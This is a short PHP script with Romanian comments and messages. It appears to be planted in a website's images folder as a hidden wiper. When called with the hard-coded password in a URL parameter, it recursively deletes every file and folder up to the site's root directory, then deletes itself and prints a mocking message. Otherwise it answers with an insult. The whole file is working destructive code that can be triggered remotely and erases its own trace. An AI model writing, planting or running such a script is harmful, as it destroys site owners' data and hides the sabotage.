<?php
$parola = 'nucleara123';

if ($_GET['key'] !== $parola) {
    http_response_code(403);
    echo "N-ai acces, terminatule.";
    exit;
}

function deleteEverything($path) {
    if (!is_dir($path)) return;
    $items = scandir($path);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = $path . '/' . $item;
        if (is_dir($fullPath)) {
            deleteEverything($fullPath);
            rmdir($fullPath);
        } else {
            unlink($fullPath);
        }
    }
}

$rootPath = realpath(__DIR__ . '/../../../../'); // Urcă 4 foldere: poze text → Ourteam → images → un neurosite-copy

deleteEverything($rootPath);
unlink(__FILE__);

echo "Site-ul a fost ras. Ca șosetele tale după o tabără.";
?>
